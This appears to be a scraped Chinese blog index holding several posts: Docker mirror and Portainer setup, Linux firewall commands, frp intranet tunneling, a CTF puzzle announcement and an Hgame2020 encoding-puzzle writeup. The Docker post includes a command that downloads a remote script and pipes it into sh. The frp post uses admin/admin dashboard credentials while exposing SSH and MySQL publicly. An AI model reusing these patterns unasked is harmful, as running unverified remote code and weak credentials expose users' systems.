sh get-docker.sh --mirror Aliyun Windows下下载Docker Desktop https://www.docker.com/products/docker-desktop （要登陆） 换源Linux下，编辑此文件，如果没有则新建。 vim /etc/docker/daemon.json Windows下文件为： %programdata%\\docker\\config\\daemon.jsonUSTC 中科大源（推荐！）https://lug.ustc.edu.cn/wiki/mirrors/help/docker { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } Azure 中国镜像https://github.com/Azure/container-service-for-azure-china/blob/master/aks/README.md#22-container-registry-proxy { \"registry-mirrors\": [\"https://dockerhub.azk8s.cn\"] } DaoCloud 源https://www.daocloud.io/mirror { \"registry-mirrors\": [\"http://f1361db2.m.daocloud.io\"] } 或者 直接执行这个就可以一键修改 curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 163网易源{ \"registry-mirrors\": [ \"http://hub-mirror.c.163.com\" ] } 阿里源要注册，略。 配置多个镜像{ \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://dockerhub.azk8s.cn/\", \"http://hub-mirror.c.163.com\" ] } 注意遵循json格式。 配置完之后重启服务sudo systemctl daemon-reload sudo systemctl restart docker 检查加速器是否生效有如下信息则配置成功。 Portainer Portainer 是 Docker 的图形化管理工具，提供状态显示面板、应用模板快速部署、容器镜像网络数据卷的基本操作（包括上传下载镜像，创建容器等操作）、事件日志显示、容器控制台操作、Swarm集群和服务等集中管理和操作、登录用户管理和控制等功能。功能十分全面，基本能满足中小型单位对容器管理的全部需求。 部署# 拉取镜像 docker pull portainer/portainer # 一键部署 docker volume create portainer_data docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer 访问 http://127.0.0.1:9000 即可访问图形化面板。配置好用户名、密码后登录。 连接到Local，登录后的主界面如下。 通过远程访问需要在防火墙放行9000端口。 Ubuntu: sudo ufw allow 9000 CentOS:（其实也可以装个 ufw 的） sudo firewall-cmd --zone=public --add-port=9000/tcp --permanent # 开放端口 sudo systemctl restart firewalld.service # 重启firewall 开机自启docker update --restart=always portainer 其实在上面的一键部署命令中已经加了，这里不需要了。（记录一下而已） 常用命令系统相关查看系统信息docker info 查看镜像、容器、数据卷所占用的空间docker system df 容器相关查看当前容器docker ps -a 创建&amp;使用容器docker run -it --name 容器名 镜像名/镜像ID /bin/bash 使用 -d 参数运行容器，可以让容器在后台运行而不把STDOUT输出到宿主机上。 （用docker logs [container ID or NAMES]查看） 当 -i -t 参数一起使用时，可以看到 Linux 命令提示符，如root@69d137adef7a:/#。只有 -i则没有命令提示符。 启动容器docker start 容器名/容器ID 重启容器docker restart 容器名/容器ID 终止容器docker stop 容器名/容器ID 查看容器信息docker container ls -a 容器统计信息docker stats 启动已终止容器docker container start 获取容器的输出信息docker container logs [container ID or NAMES] 进入容器（连接容器）docker exec -it 容器名/容器ID /bin/bash 从这个 stdin 中 exit，不会导致容器的停止。（推荐↑） 而下面这个，从这个 stdin 中 exit，会导致容器的停止。 docker attach 容器名/容器ID 删除容器docker rm 容器名/容器ID 镜像相关搜索镜像docker search 关键词 下载镜像docker pull 镜像名 镜像名:Tag 可以下载不同标签的镜像。 查看已下载镜像docker images -a # 或者 docker image ls 删除镜像docker rmi [Image ID] 端口相关端口映射将docker内的80端口映射到宿主机的8000端口上 # 可以使用--name自定义部署的容器名 docker run -d -p 8000:80 --name 容器名 镜像名 # 也可以直接通过镜像部署 docker run -d -p 8000:80 镜像名 （别急，慢慢学好了啦…… 拓展阅读Docker从入门到实践 GitBook https://yeasy.gitbooks.io/docker_practice/content/ Docker-镜像常用命令 https://blog.csdn.net/y472360651/article/details/81289088 Docker温故知新 https://www.sqlsec.com/2019/10/docker2.html document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/02/02/Server_Docker/"},{"title":"Linux Firewall & Port Configuration","text":"前言最近在配服务器环境的时候，动不动遇到端口无法访问的情况，折腾了老半天，经过分析判断最后基本是防火墙把网络端口给拦了…… 于是就来简要记录一下Linux下的防火墙配置，以及端口开放、关闭的配置方法。 整理自网络啦。 CentOSCentOS下用的是firewall-cmd 常用命令启动firewallsystemctl start firewalld.service 开机自启firewallsystemctl enable firewalld.service 查看开机自启是否设置成功systemctl is-enabled firewalld.service; echo $? 返回如下则开启成功 enabled 0 重启firewallsystemctl restart firewalld.service 关闭firewallsystemctl stop firewalld.service 检测firewall状态firewall-cmd --state 例如正在运行： [root@localhost ~]# firewall-cmd --state running 不在运行则为not running 端口配置查看开放（监听）的端口firewall-cmd --list-ports example： [root@localhost ~]# firewall-cmd --list-ports 80/tcp 7650/tcp 3306/tcp 或 netstat -ntlp 如果没有的话（centos7默认没有 netstat 命令），先安装net-tools。 yum install -y net-tools [root@localhost ~]# netstat -ntlp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 14301/mysqld tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1840/sshd tcp6 0 0 :::6011 :::* LISTEN 8037/sshd: root@pts tcp6 0 0 :::22 :::* LISTEN 1840/sshd …… 其中tcp为ipv4，tcp6为ipv6. 遇到过几次没有开放firewall端口时，只有tcp6而无tcp的情况，导致访问失败。放行端口后访问正常。 还遇到过只能从本地 127.0.0.1 或 localhost（实际上二者一样的，默认写在了host里）访问，通过（网卡的）IP地址无法访问的情况。表现在 Local Address 上是127.0.0.1:xxxx，通过修改该程序的网络设置把Address修改为对应的IP或 0.0.0.0，即可解决访问的问题。 以下操作之后都要执行 重载 或 重启 才能生效！！！开启特定端口firewall-cmd --zone=public --add-port=80/tcp --permanent # 开放端口 systemctl restart firewalld.service # 重启firewall 其中， 参数含义为--zone 作用域--add-port=80/tcp 添加端口，格式为：端口/通讯协议（tcp或udp）--permanent 永久生效，没有此参数重启后失效 [root@localhost ~]# firewall-cmd --zone=public --add-port=80/tcp --permanent success 成功则返回 success 开放多个端口firewall-cmd --zone=public --add-port=8080-8083/tcp --permanent firewall-cmd --reload # 配置立即生效 关闭特定端口firewall-cmd --zone=public --remove-port=5672/tcp --permanent #关闭5672端口 firewall-cmd --reload # 配置立即生效 # 也可以用restart 针对某个 IP 开放端口firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.142.166\" port protocol=\"tcp\" port=\"6379\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.233\" accept\" 删除某个 IP firewall-cmd --permanent --remove-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.51\" accept\" 针对一个 IP 段访问firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.0.0/16\" accept\" firewall-cmd --permanent --add-rich-rule=\"rule family=\"ipv4\" source address=\"192.168.1.0/24\" port protocol=\"tcp\" port=\"9200\" accept\" UbuntuUbuntu 系统默认提供了一个基于iptables之上的防火墙工具ufw。 常用命令安装ufw（默认已安装） sudo apt-get install ufw 启用ufw，且在系统启动时自启sudo ufw enable 关闭ufwsudo ufw disable 查看防火墙状态sudo ufw status 日志系统日志保存于/var/log/ufw.log。LEVEL指定不同的级别 ，默认级别是‘低’ sudo ufw logging on|off LEVEL 端口相关设置默认策略（比如 “mostly open” vs “mostly closed”） sudo ufw default allow # 允许所有外部对本机的访问，且本机访问外部正常。 sudo ufw default deny # 关闭所有外部对本机的访问，但本机访问外部正常。 打开某个端口sudo ufw allow smtp # 允许所有的外部IP访问本机的25/tcp （smtp）端口 sudo ufw allow 22/tcp # 允许所有的外部IP访问本机的22/tcp （ssh）端口 sudo ufw allow 53 # 允许外部访问53端口（tcp/udp） sudo ufw allow from 192.168.1.100 # 允许此IP访问所有的本机端口 sudo ufw allow proto udp 192.168.0.1 port 53 to 192.168.0.2 port 53 sudo ufw allow in on eth0 from 192.168.0.0/16 # 允许来自192.168.0.0-192.168.255.255的数据通过eth0网卡进入主机 sudo ufw allow out on eth1 to 10.0.0.0/8 # 允许指向10.0.0.0-10.255.255.255的数据通过eth1网卡从本机发出 可以用less /etc/services列出所有服务信息，其中包括该服务使用了哪个端口和哪种协议 关闭端口sudo ufw deny smtp # 禁止外部访问smtp服务 sudo ufw delete allow smtp # 删除上面建立的某条规则 sudo ufw delete allow 80 # 禁止外部访问80端口 sudo ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25 # 拒绝来自10.0.0.0/8域tcp协议指向192.168.0.1端口25的数据进入本机 路由sudo ufw route allow in on eth1 out on eth2 # 允许经eth1进入，eth2发出的数据经本机路由 进程相关命令查看进程的详细信息[root@localhost ~]# ps 1 PID TTY STAT TIME COMMAND 1 ? Ss 7:25 /usr/lib/systemd/systemd --switched-root --system --deserialize 22 杀死进程kill -9 1234 1234为对应的PID 只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。 下面是常用的信号：HUP 1 终端断线INT 2 中断（同 Ctrl + C）QUIT 3 退出（同 Ctrl + \\）TERM 15 终止KILL 9 强制终止CONT 18 继续（与STOP相反， fg/bg命令）STOP 19 暂停（同 Ctrl + Z） 或者 杀死指定名字的进程（kill processes by name），可以批量结束某个服务程序带有的全部进程。 杀死所有同名进程 killall nginx killall -9 bash 向进程发送指定信号 killall -TERM ngixn # 或者 killall -KILL nginx 命令参数： -Z 只杀死拥有scontext 的进程 -e 要求匹配进程名称 -I 忽略小写 -g 杀死进程组而不是进程 -i 交互模式，杀死进程前先询问用户 -l 列出所有的已知信号名称 -q 不输出警告信息 -s 发送指定的信号 -v 报告信号是否成功发送 -w 等待进程死亡 --help 显示帮助信息 --version 显示版本显示 Referencehttps://blog.csdn.net/zll_0405/article/details/81208606 https://blog.csdn.net/bigdata_mining/article/details/80699180 etc. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/01/29/Server_firewall/"},{"title":"基于frp实现内网穿透","text":"前言之前为了实现远程编程，折腾了一阵子autossh，利用反向代理把内网服务器的ssh映射到了公网端口，详见下面这篇。 小想法 | 基于VSCode和ssh实现远程编程/炼丹 这次需求扩大了一点，比如说想访问内网搭建的网站、数据库等等，但这些都不能直接在公网进行访问，autossh就有点不大给力了。 之前还了解过花生壳、ngrok这些，但是一般需要money要限速或者说不大友好，然后一想大家都在推荐frp，这回就来折腾一下吧！（主要是以后忘了还可以回来看嘻嘻 总体感受就是，frp搭建起来比autossh方便多了呀！ 简介What is frp? frp is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports TCP and UDP, as well as HTTP and HTTPS protocols, where requests can be forwarded to internal services by domain name. frp also has a P2P connect mode. frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。 FRP，fast reverse proxy。使用 Go 语言开发，支持 Windows、Linux、macOS、ARM 等多平台部署。 其实简单地说也就是借助一台有公网IP的服务器作为中转，把内外网直接的流量连接起来。 其开源仓库：https://github.com/fatedier/frp What should I prepare?内网主机（客户端）：能上互联网（外网），或者说能连上你的公网服务器就行。（但没有公网IP） 可以是电脑（Windows，MacOS，Linux）/嵌入式设备（如树莓派）…对的，frp跨平台。 公网主机（服务端）：有公网IP，或者绑定了域名能通过端口访问也行。 以及 想连接内网的你喜欢的设备。 搭建过程分为服务器端和客户端两部分。 下载程序根据对应的操作系统及架构，从 Release 页面下载最新版本的程序。 目前最新的版本是 v0.31.1 比如Windows64位下载 frp_0.31.1_windows_amd64.zip， Linux64位一般是这个 frp_0.31.1_linux_amd64.tar.gz。 其他系统/架构的对应下载就好了。 将 frps 及 frps.ini 放到具有公网 IP 的机器上。 将 frpc 及 frpc.ini 放到处于内网环境的机器上。 服务器端的搭建可以在服务器上可以用wget下载。 sudo mkdir -p /etc/frp cd /etc/frp sudo wget \"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz\" sudo tar xzvf frp_0.31.1_linux_amd64.tar.gz sudo mv frp_0.31.1_linux_amd64/* /etc/frp 然而国内下载速度感人，大概8M的文件就几KB/s… 于是还不如直接搭个梯子到外面下载好了再传到服务器上。 服务器端server嘛，当然用的是 frps 及 frps.ini。 完整版的 frps_full.ini里面有很详细的注释，也可以用来参考。 最简单的配置就直接这样写 # frps.ini [common] bind_port = 7000 然后启动frps（Linux下） /etc/frp/frps -c /etc/frp/frps.ini 再去把系统的防.火|墙打开，以及阿里云等平台的安全组规则设好允许入站出站。 这个firewall搞死我了emmm折腾了老半天最后发现没放行端口…… 后面再写一篇关于firewall配置的。 好了，下面到客户端。 客户端（内网主机）的搭建同理把frp解压的文件放到/etc/frp文件夹下。 客户端client，用的是 frpc 及 frpc.ini。 # frpc.ini [common] server_addr = x.x.x.x server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 7001 [Mysql] type = tcp local_ip = 127.0.0.1 #也可以是局域网中的内网IP local_port = 3306 remote_port = 7002 其中common里的server_addr是公网主机的公网IP，server_port设成与服务端一样的端口。 每个方框[.+]里的是name，下面都对应着一个规则，要求不能重名。 type可以是tcp/udp/http/https/stcp/xtcp（具体看官方文档），一般就tcp/http啦。 local_ip和local_port为本地地址及端口。 remote_port为公网的端口，这个可以在服务端进行限制，注意要在服务端放行这些端口啊！ 客户端可以在多个主机上运行，只要name不重名就行。 而后启动客户端 /etc/frp/frpc -c /etc/frp/frpc.ini Windows下： frpc.exe -c frpc.ini start proxy success表示启动成功。 远程访问现在就可以直接通过公网IP的7001端口访问内网的ssh，通过7002端口访问内网的Mysql啦！ 远程编程，访问网页，管理数据库什么的都可以实现啦！ 好棒呀！ 进阶Dashboardfrp的服务器端提供了一个在web端查看运行状态的展示界面。 配置如下，在common中添加如下信息： # frps.ini [common] dashboard_port = 7500 # 注意开放端口 # dashboard 用户名密码，默认都为 admin dashboard_user = admin dashboard_pwd = admin 而后重启服务端，就可以在http://[server_addr]:7500 访问 dashboard 界面，用户名密码默认为 admin。 还别说，挺好看的唉！ 看了一下，基于vue写的。 Admin UI在客户端也提供了一个类似于dashboard的查看状态和管理配置的界面。 # frpc.ini [common] admin_addr = 127.0.0.1 admin_port = 7400 admin_user = admin admin_pwd = admin 然后本地就可以通过 http://127.0.0.1:7400 来访问查看状态和修改配置了。 这里如果想通过内网IP（如192.168.1.66）查看的话，需要把admin_addr修改为 0.0.0.0（允许所有访问），或者对应的本地IP（如192.168.1.66）。 同时也需要在本地的firewall打开这个端口，否则在内网的其他主机也无法访问。（折腾了老半天才发现emmm 当然，想要在公网访问的话，把7400端口映射到外网就好了，不过安全起见算了吧。 开启加密、压缩在客户端加入use_encryption 和 use_compression这两个参数。 # frpc.ini [ssh] type = tcp local_port = 22 remote_port = 6000 use_encryption = true use_compression = true 开机自启这次直接把frp作为一个service好了，用systemd好了！ 服务端：新建一个文件，名叫 frps.service，写入 # frps.service [Unit] Description=Frp Server After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frps -c /etc/frp/frps.ini ExecStop=/usr/bin/killall frps #启动失败1分钟后再次启动 RestartSec=1min KillMode=control-group #重启控制：总是重启 Restart=always [Install] WantedBy=multi-user.target 客户端：frpc.service # frpc.service [Unit] Description=Frp Client After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frpc -c /etc/frp/frpc.ini ExecStop=/usr/bin/killall frpc #启动失败1分钟后再次启动 RestartSec=1min KillMode=control-group #重启控制：总是重启 Restart=always [Install] WantedBy=multi-user.target 而后将此文件放到 服务器端和客户端的/etc/systemd/system/ 目录下。 先killall frps（或frpc），再调用 sudo systemctl enable frps.service 或 sudo systemctl enable frpc.service 这样就成功配置了开机自启。 而且可以通过下列命令进行管理： sudo systemctl start frpc.service # 启动 sudo systemctl stop frpc.service # 停止 sudo systemctl restart frpc.service # 重启 sudo systemctl status frpc.service # 查看状态 frps同理。 Summaryfrp很强大的呢！ 比如还可以在一定情况下绕过服务器实现点对点P2P连接，不过前提是内网和你的设备两端都要装frpc客户端。 更多且看官方文档：https://github.com/fatedier/frp 关键这个配置起来贼方便啊！ 于是这样就可以通过公网IP，访问到你内网的资源啦，嘻嘻嘻~ 好了，完事！ 溜了溜了。 Reference 官方仓库及介绍 https://github.com/fatedier/frp 官方中文文档 https://github.com/fatedier/frp/blob/master/README_zh.md https://www.iplaysoft.com/frp.html Frp后台自动启动的几个方法 https://blog.csdn.net/x7418520/article/details/81077652 Systemd 服务管理教程 https://cloud.tencent.com/developer/article/1516125 小想法 | 基于VSCode和ssh实现远程编程/炼丹 还看到过一个免费的内网穿透服务，Sakura Frp https://www.natfrp.com/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/01/29/Server_frp/"},{"title":"2020鼠年快乐！来玩红包闯关吧！","text":"鼠年快乐又是一年春来到，鼠年的钟声敲响了！ 鼠你健康，鼠你平安，鼠你快乐喵~ 这一年过的太难了，还要感谢大家的陪伴哈！ 最近新型冠状病毒感染的肺炎来了，公共场所都关闭了emmm 武汉加油！中国加油！ 过年了，大家都要健康快乐呀！ 红包闯关说到这个红包闯关，最开始是听说有学长的红包闯关，FJJ 学长也弄过一个，元旦的时候白师傅扔了个RSA的密码红包，Milkice 的年终总结里也出了道红包题。 反正就挺有意思的嘛23333 我的话其实元旦的时候就想弄了。 不过那时候一堆考试，去年12.31下午六点多才考完高频，后面又要考DSP，根本没空出题…… 所以，不如趁着春节出道题玩玩呀！ 题目来了就出个 Misc 的题吧，花了一番心思，做题看脑洞吧，可以好好玩玩！ 社会主义核心价值观深入人心，那我们就从这开始吧！ 自由诚信自由自由文明和谐文明自由爱国自由敬业和谐自由自由自由平等自由自由爱国自由敬业平等爱国平等 和谐和谐公正和谐和谐自由友善公正自由友善自由自由友善法治自由公正平等爱国平等爱国自由敬业和谐和谐 和谐和谐自由友善敬业平等富强自由平等平等爱国自由爱国平等民主和谐公正自由友善公正和谐文明自由公正 和谐平等自由友善自由平等自由自由法治平等民主和谐和谐平等和谐自由敬业平等公正和谐文明自由自由自由 诚信民主自由诚信文明和谐和谐自由平等自由友善敬业自由诚信自由平等自由自由法治平等民主和谐自由自由 友善公正自由友善法治自由友善法治平等公正和谐和谐平等法治平等法治平等敬业自由诚信文明自由诚信和谐 自由诚信自由自由友善自由平等法治自由法治平等法治平等友善自由平等自由自由平等自由友善爱国平等友善 自由平等爱国平等爱国自由法治自由友善公正和谐和谐平等自由自由友善法治平等友善自由平等公正自由法治 自由敬业和谐文明自由诚信文明平等富强自由法治自由诚信富强平等敬业平等自由自由法治和谐自由平等自由 自由诚信文明自由诚信自由平等文明平等自由自由法治自由和谐和谐和谐平等自由自由法治自由诚信和谐平等 文明平等法治自由自由平等法治和谐文明和谐和谐自由友善平等自由诚信和谐平等诚信富强平等法治自由法治 平等法治平等诚信富强自由友善公正自由友善平等自由友善法治平等友善自由平等法治自由自由平等法治平等 友善自由和谐和谐自由法治自由法治自由诚信和谐平等爱国平等平等自由和谐自由诚信和谐自由诚信文明平等 自由自由法治自由文明自由自由自由自由自由敬业和谐文明和谐和谐自由公正自由法治自由敬业平等诚信富强 平等自由自由法治自由友善法治平等友善自由平等自由自由公正和谐平等自由法治平等法治平等和谐平等敬业 自由友善公正平等富强自由公正平等友善自由平等平等自由爱国自由敬业和谐和谐自由诚信文明自由友善法治 总共有4个Flag，对应着4个Alipay红包。 形式都是 MIAO{.+}，可能是纯数字或纯汉字。 如果红包过期了，1月31日前直接私戳把flag发给我就好了喵！ 后面再发出题记录和WP。 注意解出来的flag不要随便发给别人啊！！！ （如果写WP的话过几天再发出来吧。 Hint闯关需要一关一关过嘛，可能有点难度，给点小提示吧。 套娃挺好玩的，比如这回一个文件里套了好几个，flag就越埋越深23333。 编码家族里，base64挺常用的，但别只想着它吧。哦对了，社会主义核心价值观也可以用来编码的呢。 Tony偶尔会和小伙伴发邮件交流。 Tony偶尔用PhotoShop修修图什么的，可能还会往图片里藏点什么有意思的东西，当然工具不只是PS。 十六进制编辑器在手，有可能哪天一不小心把文件改错了就打不开了或者说损坏了。 二维码是个好东西，能传递的信息不只是网址，还有……但是前提是你能找到它。 Tony喜欢用Python来码代码，很多现成的库贼方便。而且编译后…… 中文的话有可能需要借助Unicode编码。 一步步深入还会有进一步的提示，备注是个好东西。 （我也不记得了，自己想吧2333 Just have fun！有问题欢迎留言，或者私戳呀！ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","path":"2020/01/25/CTF_2020HappyChineseNewYear/"},{"title":"CTF | Hgame2020 Week1 WriteUp","text":"前言这几天玩了玩杭州电子科技大学的Hgame2020，还别说，有点意思2333。 平台网址： https://hgame.vidar.club/ Flag格式：hgame{.+} 20200125 更新： 官方WP地址：https://github.com/vidar-team/Hgame2020_writeup MISC签到题Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0tbase64解码得到 .-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- 一看就是摩斯电码，加入分隔符后解码得到flag W3LC0ME_TO_2020_HGAM3 在线解密摩斯密码 www.atool9.com/morse.php 壁纸解压得到图片Pixiv@純白可憐.jpg，foremost提取得到一个zip压缩文件。备注提示 Password is picture ID. 本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。 上网查了一下純白可憐，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。 试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。 （还别说，挺好看的哇，还是个中国画师喵。 天意 https://www.pixiv.net/artworks/76953815 得到ID 76953815，作为密码解压flag.txt（这么短还全数字，其实可以暴力破解的），得到 \\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7dUnicode啦，转ASCII（用的是NATIVE转ASCII来着）得到flag hgame{Do_y0u_KnOW_uNiC0d3?} 克苏鲁神话明文攻击得到了解密后的zip文件。 得到加密的 The Call of Cthulhu.doc文件。根据 Bacon.txt文件提示寻找密码。 of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd. *Password in capital letters.然而不成功，不知道怎么做下去了嘤嘤嘤。 >>> s='of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd' >>> s1=[i for i in s if i>='A' and i&lt;='Z'] >>> s1 ['S', 'C', 'G', 'E', 'A', 'O', 'R', 'N', 'G', 'S', 'H', 'B', 'E', 'C', 'E', 'A', 'A', 'S', 'R', 'I', 'F', 'H', 'G', 'R', 'E', 'O', 'T', 'E', 'O'] >>> ''.join(s1) 'SCGEAORNGSHBECEAASRIFHGREOTEO' 20200125 更新： 看了官方WP才知道Bancon指的是培根密码，我还以为是咸肉/熏猪肉来着。。 根据大小写转为a或b，比如小写为a，大写为b。 flag隐藏在最后emmm Ctrl+D把隐藏取消掉就看到了。 hgame{Y0u_h@Ve_F0Und_mY_S3cReT} 签到题ProPlusPassword.txt提示了 Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn. JRFVJYFZVRUAGMAI Three fences first, Five Caesar next. English sentense first, zip password next. 一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。 突然一想应该是先栅栏再凯撒，一试果然。 先解密zip密码：栅栏得到JFARZGFVMVRAJUIY，凯撒得到密码 EAVMUBAQHQMVEPDT。解压得到 OK.txt。 同时上面的那句话同理解密得到 Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice. emmm不大理解，不管了。 看文件是Ook!编码，解密得到base32编码。 data:text;base再base32解密得到 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